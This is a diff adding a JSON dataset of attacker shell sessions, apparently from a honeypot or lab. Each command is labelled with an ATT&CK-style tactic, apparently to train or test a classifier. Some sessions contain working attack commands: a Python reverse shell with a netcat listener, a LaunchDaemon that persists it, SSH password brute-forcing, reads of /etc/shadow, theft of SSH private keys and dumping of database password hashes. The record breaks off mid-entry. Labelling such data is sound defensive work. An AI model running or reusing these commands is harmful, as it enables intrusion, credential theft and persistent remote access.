@@ -1,0 +1,1427 @@
+[
+  {
+    "session": "uname -a; id; cat /etc/os-release ; echo $PATH ; help ; mail ; ls ; echo * ;",
+    "full_session": [
+      {
+        "command": "uname -a;",
+        "label": "Discovery"
+      },
+      {
+        "command": "id;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/os-release ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo $PATH ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "help ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "mail ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "ls ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo * ;",
+        "label": "Harmless"
+      }
+    ]
+  },
+  {
+    "session": "uname -a; id; cat /etc/passwd | head -20; ls -la /root; cat /root/* 2>/dev/null | head -50 ; uname -a ; /bin/uname -a ; echo $PATH ; sh -c 'echo test' ; help ; mail ; ps -ef ; /bin/ls -la / ;",
+    "full_session": [
+      {
+        "command": "uname -a;",
+        "label": "Discovery"
+      },
+      {
+        "command": "id;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/passwd |",
+        "label": "Discovery"
+      },
+      {
+        "command": "head -20;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /root;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /root/* 2>/dev/null |",
+        "label": "Discovery"
+      },
+      {
+        "command": "head -50 ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "/bin/uname -a ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo $PATH ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "sh -c 'echo test' ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "help ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "mail ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "ps -ef ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "/bin/ls -la / ;",
+        "label": "Discovery"
+      }
+    ]
+  },
+  {
+    "session": "gobuster dir -u http://172.20.0.3:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -q ; whoami ; nmap -p 2222 -sV -Pn 172.20.0.3 ; echo $PS1 ;",
+    "full_session": [
+      {
+        "command": "gobuster dir -u http://172.20.0.3:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -q ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "whoami ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "nmap -p 2222 -sV -Pn 172.20.0.3 ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo $PS1 ;",
+        "label": "Discovery"
+      }
+    ]
+  },
+  {
+    "session": "id ; whoami ; echo $SHELL && ls /bin /usr/bin ; sh ; help ; systeminfo ; uname -a ;",
+    "full_session": [
+      {
+        "command": "id ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "whoami ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo $SHELL &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls /bin /usr/bin ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "sh ;",
+        "label": "Execution"
+      },
+      {
+        "command": "help ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "systeminfo ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Discovery"
+      }
+    ]
+  },
+  {
+    "session": "hydra -l root -P /usr/share/wordlists/fasttrack.txt -s 2222 -f -o hydra_ssh_results.txt ssh://172.20.0.3 ; uname -a; cat /etc/os-release; id; ls -lah /root; ls -lah /etc/ssh; ls -lah /home ; uname -a ; echo $0; echo $PATH ; /bin/sh -c 'uname -a' ; /bin/bash -c 'uname -a' ; help ; ftp 172.20.0.3 ; systeminfo; ls -lah /root; ls -lah /etc/ssh; ls -lah /Users ; sw_vers; ls -lA /var/root; ls -lA /etc/ssh; ls -lA /Users ;",
+    "full_session": [
+      {
+        "command": "hydra -l root -P /usr/share/wordlists/fasttrack.txt -s 2222 -f -o hydra_ssh_results.txt ssh://172.20.0.3 ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "uname -a;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/os-release;",
+        "label": "Discovery"
+      },
+      {
+        "command": "id;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /root;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /etc/ssh;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /home ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo $0;",
+        "label": "Discovery"
+      },
+      {
+        "command": "echo $PATH ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "/bin/sh -c 'uname -a' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "/bin/bash -c 'uname -a' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "help ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "ftp 172.20.0.3 ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "systeminfo;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /root;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /etc/ssh;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /Users ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "sw_vers;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lA /var/root;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lA /etc/ssh;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lA /Users ;",
+        "label": "Discovery"
+      }
+    ]
+  },
+  {
+    "session": "sshpass -p toor ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 echo 'success' ; sshpass -p password ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 echo 'success' ; sshpass -p 123456 ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 echo 'success' ; sshpass -p admin ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 echo 'success' ; apt-get update && apt-get install -y sshpass ; ssh root@172.20.0.3 -p 2222 ; uname -a ; whoami ; id ; set ;",
+    "full_session": [
+      {
+        "command": "sshpass -p toor ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 echo 'success' ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "sshpass -p password ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 echo 'success' ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "sshpass -p 123456 ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 echo 'success' ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "sshpass -p admin ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 echo 'success' ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "apt-get update &&",
+        "label": "Harmless"
+      },
+      {
+        "command": "apt-get install -y sshpass ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "ssh root@172.20.0.3 -p 2222 ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "whoami ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "id ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "set ;",
+        "label": "Discovery"
+      }
+    ]
+  },
+  {
+    "session": "uname -a; hostname; id; ls -la /root; cat /etc/passwd | tail -n 10 ; ls -la /Users ; ls -la /Users/user ; cat /Users/user/notes.txt ; cat /Users/user/config.plist ; kextstat ; ls -la /System/Library/Extensions/com.example.unsafe.kext/ ; ls -la /Library/Extensions/ ; find / -type f -iname '*unsafe*' -o -iname '*example*' 2>/dev/null ; cat /Library/Extensions/com.example.unsafe.kext/Contents/Info.plist ; ls -la /Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext ; file /Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext ; ls -l /Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext ; strings /Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext | head -n 40 ; scp -P 2222 root@172.20.0.3:/Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext . ; ls -ld /Library/Extensions/com.example.unsafe.kext ; ls -la /Library/LaunchDaemons/ ; ls -la /Library/LaunchAgents/ ; cat /Library/LaunchDaemons/com.example.unsafe.plist ; python3 --version ; python --version ; nc -nlvp 4444 & ; cat > /tmp/rev.py << EOFimport socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"172.20.0.2\",4444))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)import ptypty.spawn(\"/bin/bash\")EOF ; python3 /tmp/rev.py ; find / -perm -4000 -type f 2>/dev/null ; sudo -l ; ps aux ; crontab -l ; ls -la /etc/cron.* ; cat /etc/cron.daily/daily_script.sh ; ls -la /backup ; tar -tvf /backup/daily_backup_2023-12-03.tar.gz ; tar -xvf /backup/daily_backup_2023-12-03.tar.gz -C /tmp important_files/secrets.txt && cat /tmp/important_files/secrets.txt ; ps aux | grep -i mysql ; ps aux | grep -i postgres ; mysql -u admin -pP@ssw0rd123 -e 'SHOW DATABASES;' ; mysql -u admin -pP@ssw0rd123 -e 'USE user_data; SHOW TABLES;' ; mysql -u admin -pP@ssw0rd123 -e 'SELECT * FROM user_data.users LIMIT 10;' ; mysql -u admin -pP@ssw0rd123 -e 'SELECT username, password_hash FROM user_data.users;' -B -N > /tmp/passhashes.txt ; which john ; mysql -u admin -pP@ssw0rd123 -e 'USE app_database; SHOW TABLES;' ; mysql -u admin -pP@ssw0rd123 -e 'SELECT * FROM app_database.accounts LIMIT 10;' ; mysql -u admin -pP@ssw0rd123 -e 'SELECT * FROM app_database.transactions LIMIT 10;' ; mkdir -p /tmp/exfil; cp /tmp/passhashes.txt /tmp/exfil/passhashes.txt; tar -czf /tmp/exfil_data.tar.gz /tmp/exfil ; cat > /Library/LaunchDaemons/com.reverse.shell.plist << EOF<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"><plist version=\"1.0\"><dict>    <key>Label</key>    <string>com.reverse.shell</string>    <key>ProgramArguments</key>    <array>        <string>/usr/bin/python3</string>        <string>/tmp/rev.py</string>    </array>    <key>RunAtLoad</key>    <true/>    <key>KeepAlive</key>    <true/></dict></plist>EOF ; launchctl load /Library/LaunchDaemons/com.reverse.shell.plist ;",
+    "full_session": [
+      {
+        "command": "uname -a;",
+        "label": "Discovery"
+      },
+      {
+        "command": "hostname;",
+        "label": "Discovery"
+      },
+      {
+        "command": "id;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /root;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/passwd |",
+        "label": "Discovery"
+      },
+      {
+        "command": "tail -n 10 ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Users ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Users/user ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Users/user/notes.txt ;",
+        "label": "Collection"
+      },
+      {
+        "command": "cat /Users/user/config.plist ;",
+        "label": "Collection"
+      },
+      {
+        "command": "kextstat ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /System/Library/Extensions/com.example.unsafe.kext/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Library/Extensions/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "find / -type f -iname '*unsafe*' -o -iname '*example*' 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Library/Extensions/com.example.unsafe.kext/Contents/Info.plist ;",
+        "label": "Collection"
+      },
+      {
+        "command": "ls -la /Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "file /Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -l /Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "strings /Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext |",
+        "label": "Discovery"
+      },
+      {
+        "command": "head -n 40 ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "scp -P 2222 root@172.20.0.3:/Library/Extensions/com.example.unsafe.kext/Contents/MacOS/com.example.unsafe.kext . ;",
+        "label": "Exfiltration"
+      },
+      {
+        "command": "ls -ld /Library/Extensions/com.example.unsafe.kext ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Library/LaunchDaemons/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Library/LaunchAgents/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Library/LaunchDaemons/com.example.unsafe.plist ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "python3 --version ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "python --version ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "nc -nlvp 4444 & ;",
+        "label": "Command and Control"
+      },
+      {
+        "command": "cat > /tmp/rev.py << EOFimport socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\"172.20.0.2\",4444))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)import ptypty.spawn(\"/bin/bash\")EOF ;",
+        "label": "Command and Control"
+      },
+      {
+        "command": "python3 /tmp/rev.py ;",
+        "label": "Command and Control"
+      },
+      {
+        "command": "find / -perm -4000 -type f 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "sudo -l ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ps aux ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "crontab -l ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /etc/cron.* ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/cron.daily/daily_script.sh ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /backup ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "tar -tvf /backup/daily_backup_2023-12-03.tar.gz ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "tar -xvf /backup/daily_backup_2023-12-03.tar.gz -C /tmp important_files/secrets.txt &&",
+        "label": "Collection"
+      },
+      {
+        "command": "cat /tmp/important_files/secrets.txt ;",
+        "label": "Collection"
+      },
+      {
+        "command": "ps aux | grep -i mysql ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ps aux | grep -i postgres ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -u admin -pP@ssw0rd123 -e 'SHOW DATABASES;' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -u admin -pP@ssw0rd123 -e 'USE user_data; SHOW TABLES;' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -u admin -pP@ssw0rd123 -e 'SELECT * FROM user_data.users LIMIT 10;' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "mysql -u admin -pP@ssw0rd123 -e 'SELECT username, password_hash FROM user_data.users;' -B -N > /tmp/passhashes.txt ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "which john ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -u admin -pP@ssw0rd123 -e 'USE app_database; SHOW TABLES;' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -u admin -pP@ssw0rd123 -e 'SELECT * FROM app_database.accounts LIMIT 10;' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "mysql -u admin -pP@ssw0rd123 -e 'SELECT * FROM app_database.transactions LIMIT 10;' ;",
+        "label": "Collection"
+      },
+      {
+        "command": "mkdir -p /tmp/exfil;",
+        "label": "Defense Evasion"
+      },
+      {
+        "command": "cp /tmp/passhashes.txt /tmp/exfil/passhashes.txt;",
+        "label": "Exfiltration"
+      },
+      {
+        "command": "tar -czf /tmp/exfil_data.tar.gz /tmp/exfil ;",
+        "label": "Exfiltration"
+      },
+      {
+        "command": "cat > /Library/LaunchDaemons/com.reverse.shell.plist << EOF<?xml ...",
+        "label": "Persistence"
+      },
+      {
+        "command": "launchctl load /Library/LaunchDaemons/com.reverse.shell.plist ;",
+        "label": "Persistence"
+      }
+    ]
+  },
+  {
+    "session": "hostnamectl ; cat /etc/passwd ; ls -la /root ; ls -la /Users/user ; cat /Users/user/notes.txt ; ls -la /Library/Extensions/ ; ls -la /Library/Extensions/com.example.unsafe.kext ; ls -la /Library/Extensions/com.example.unsafe.kext/Contents ; cat /Library/Extensions/com.example.unsafe.kext/Contents/Info.plist ; kextstat | grep unsafe ; searchsploit com.example.unsafe.kext ; find / -type f -perm -4000 -exec ls -ld {} \\; 2>/dev/null ; crontab -l ; cat /etc/crontab ; ls -la /etc/cron.hourly ; cat /etc/cron.hourly/hourly_script.sh ; ls -la /backup ; mkdir /tmp/backup_analysis ; tar -xzf /backup/hourly_backup_2023-12-03_01-00.tar.gz -C /tmp/backup_analysis ; ls -la /tmp/backup_analysis/etc ; cat /tmp/backup_analysis/etc/passwd ; find /Users/user -type f \\( -name \"*.pem\" -o -name \"*.key\" -o -name \"*.id_rsa\" \\) -ls 2>/dev/null ; cat /Users/user/.ssh/id_rsa ; ssh -i /Users/user/.ssh/id_rsa -p 2222 user@172.20.0.3 ; ls -la /Users/user/.ssh ; cat /Users/user/.ssh/id_rsa.pub ; cat /Users/user/.ssh/known_hosts ; cat /Users/user/config.plist ; searchsploit macOS kernel extension privilege escalation ; cat /Users/user/private/mykey.key ; ls -la /Users/user/private ; ls -la /Users/user/certificates ; cat /Users/user/certificates/mycert.pem ;",
+    "full_session": [
+      {
+        "command": "hostnamectl ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/passwd ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /root ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Users/user ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Users/user/notes.txt ;",
+        "label": "Collection"
+      },
+      {
+        "command": "ls -la /Library/Extensions/ ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Library/Extensions/com.example.unsafe.kext ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Library/Extensions/com.example.unsafe.kext/Contents ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Library/Extensions/com.example.unsafe.kext/Contents/Info.plist ;",
+        "label": "Collection"
+      },
+      {
+        "command": "kextstat | grep unsafe ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "searchsploit com.example.unsafe.kext ;",
+        "label": "Reconnaissance"
+      },
+      {
+        "command": "find / -type f -perm -4000 -exec ls -ld {} \\; 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "crontab -l ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/crontab ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /etc/cron.hourly ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/cron.hourly/hourly_script.sh ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /backup ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mkdir /tmp/backup_analysis ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "tar -xzf /backup/hourly_backup_2023-12-03_01-00.tar.gz -C /tmp/backup_analysis ;",
+        "label": "Collection"
+      },
+      {
+        "command": "ls -la /tmp/backup_analysis/etc ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /tmp/backup_analysis/etc/passwd ;",
+        "label": "Collection"
+      },
+      {
+        "command": "find /Users/user -type f \\( -name \"*.pem\" -o -name \"*.key\" -o -name \"*.id_rsa\" \\) -ls 2>/dev/null ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Users/user/.ssh/id_rsa ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "ssh -i /Users/user/.ssh/id_rsa -p 2222 user@172.20.0.3 ;",
+        "label": "Lateral Movement"
+      },
+      {
+        "command": "ls -la /Users/user/.ssh ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Users/user/.ssh/id_rsa.pub ;",
+        "label": "Collection"
+      },
+      {
+        "command": "cat /Users/user/.ssh/known_hosts ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Users/user/config.plist ;",
+        "label": "Collection"
+      },
+      {
+        "command": "searchsploit macOS kernel extension privilege escalation ;",
+        "label": "Reconnaissance"
+      },
+      {
+        "command": "cat /Users/user/private/mykey.key ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "ls -la /Users/user/private ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Users/user/certificates ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Users/user/certificates/mycert.pem ;",
+        "label": "Collection"
+      }
+    ]
+  },
+  {
+    "session": "id ; ls -l /home/kimmy ; ls -l /home/kimmy/Documents ; ls -la /home/kimmy ; cat /home/kimmy/notes.txt ; cat /home/kimmy/.hidden_file ; kextstat ; find / -perm -4000 -type f ; env ; find /usr/local/bin /usr/bin /bin /usr/sbin /sbin -writable -type d ; crontab -l ; ls -la /Library/LaunchDaemons /Library/LaunchAgents ; cat /Library/LaunchDaemons/com.example.daemon.plist ; cat /Library/LaunchAgents/com.example.agent.plist ; launchctl stop system/com.example.daemon ; launchctl stop com.example.daemon ; launchctl start com.example.daemon ; sudo reboot ; cat /home/kimmy/.bash_history ; cat /etc/shadow ; cat /etc/shadow ; sudo -l ; sudo -l ; launchctl stop com.example.daemon ; launchctl start com.example.daemon ; launchctl stop com.example.daemon ; launchctl stop com.example.daemon ;",
+    "full_session": [
+      {
+        "command": "id ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -l /home/kimmy ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -l /home/kimmy/Documents ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /home/kimmy ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /home/kimmy/notes.txt ;",
+        "label": "Collection"
+      },
+      {
+        "command": "cat /home/kimmy/.hidden_file ;",
+        "label": "Collection"
+      },
+      {
+        "command": "kextstat ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "find / -perm -4000 -type f ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "env ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "find /usr/local/bin /usr/bin /bin /usr/sbin /sbin -writable -type d ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "crontab -l ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -la /Library/LaunchDaemons /Library/LaunchAgents ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /Library/LaunchDaemons/com.example.daemon.plist ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "cat /Library/LaunchAgents/com.example.agent.plist ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "launchctl stop system/com.example.daemon ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "launchctl stop com.example.daemon ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "launchctl start com.example.daemon ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "sudo reboot ;",
+        "label": "Impact"
+      },
+      {
+        "command": "cat /home/kimmy/.bash_history ;",
+        "label": "Collection"
+      },
+      {
+        "command": "cat /etc/shadow ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "cat /etc/shadow ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "sudo -l ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "sudo -l ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "launchctl stop com.example.daemon ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "launchctl start com.example.daemon ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "launchctl stop com.example.daemon ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "launchctl stop com.example.daemon ;",
+        "label": "Persistence"
+      }
+    ]
+  },
+  {
+    "session": "sshpass -p toor ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 ; id && uname -a && hostname && cat /etc/os-release ; id && uname -a && hostname && cat /etc/os-release ; ls -lah /root/ && ls -lah /etc/ && cat /etc/passwd | grep -v '^#' | grep -v '^$' ; ls -lah /root/ && ls -lah /etc/ && cat /etc/passwd | grep -v '^#' | grep -v '^$' ; cat /root/root_notes.txt ; cat /root/root_notes.txt ; cat /root/secret.txt ; cat /root/secret.txt ; nmap -p 3306,5432,27017 172.20.0.3 ; nmap -p 3306,5432,27017 172.20.0.3 ; mysql -h 172.20.0.3 -P 3306 -u db_user -pP@ssw0rd123 -e 'SHOW DATABASES;' ; mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SHOW DATABASES;' ; mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SHOW TABLES;' app_database ; mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SHOW TABLES;' app_database ; mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SELECT * FROM accounts LIMIT 10;' app_database ; mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SELECT * FROM accounts LIMIT 10;' app_database ; scp -P 2222 root@172.20.0.3:/root/.ssh/id_rsa ./id_rsa ; cat /etc/config.yaml ; ls -lah /root/.ssh/ ; ls -lah /root/.ssh/ ; scp -P 2222 root@172.20.0.3:/root/.ssh/id_rsa ./id_rsa ; scp -P 2222 root@172.20.0.3:/root/.ssh/id_rsa ./id_rsa ; ls -l ./id_rsa ; cat /root/.ssh/known_hosts ; cat /root/.ssh/known_hosts ; ssh -i ./id_rsa root@192.168.1.10 ; ssh -i ./id_rsa root@192.168.1.10 ; id && uname -a && hostname && cat /etc/os-release ; ssh-keygen -y -f ./id_rsa ; ssh-keygen -y -f ./id_rsa ; ssh-agent bash ; ssh-add ./id_rsa ; ssh -A root@192.168.1.10 ; ssh -A root@192.168.1.10 ;",
+    "full_session": [
+      {
+        "command": "sshpass -p toor ssh -o StrictHostKeyChecking=no -p 2222 root@172.20.0.3 ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "id &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "uname -a &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "hostname &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/os-release ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "id &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "uname -a &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "hostname &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/os-release ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /root/ &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /etc/ &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/passwd |",
+        "label": "Discovery"
+      },
+      {
+        "command": "grep -v '^#' |",
+        "label": "Discovery"
+      },
+      {
+        "command": "grep -v '^$' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /root/ &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "ls -lah /etc/ &&",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /etc/passwd |",
+        "label": "Discovery"
+      },
+      {
+        "command": "grep -v '^#' |",
+        "label": "Discovery"
+      },
+      {
+        "command": "grep -v '^$' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "cat /root/root_notes.txt ;",
+        "label": "Collection"
+      },
+      {
+        "command": "cat /root/root_notes.txt ;",
+        "label": "Collection"
+      },
+      {
+        "command": "cat /root/secret.txt ;",
+        "label": "Collection"
+      },
+      {
+        "command": "cat /root/secret.txt ;",
+        "label": "Collection"
+      },
+      {
+        "command": "nmap -p 3306,5432,27017 172.20.0.3 ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "nmap -p 3306,5432,27017 172.20.0.3 ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -h 172.20.0.3 -P 3306 -u db_user -pP@ssw0rd123 -e 'SHOW DATABASES;' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SHOW DATABASES;' ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SHOW TABLES;' app_database ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SHOW TABLES;' app_database ;",
+        "label": "Discovery"
+      },
+      {
+        "command": "mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SELECT * FROM accounts LIMIT 10;' app_database ;",
+        "label": "Collection"
+      },
+      {
+        "command": "mysql -h 172.20.0.3 -P 3306 -u db_user -p'P@ssw0rd123' -e 'SELECT * FROM accounts LIMIT 10;' app_database ;",
+        "label": "Collection"
+      },
+      {
+        "command": "scp -P 2222 root@172.20.0.3:/root/.ssh/id_rsa ./id_rsa ;",
+        "label": "Credential Access"
+      },
+      {
+        "command": "cat /etc/config.yaml ;",
+        "label": "Collection"
+      },
+      {
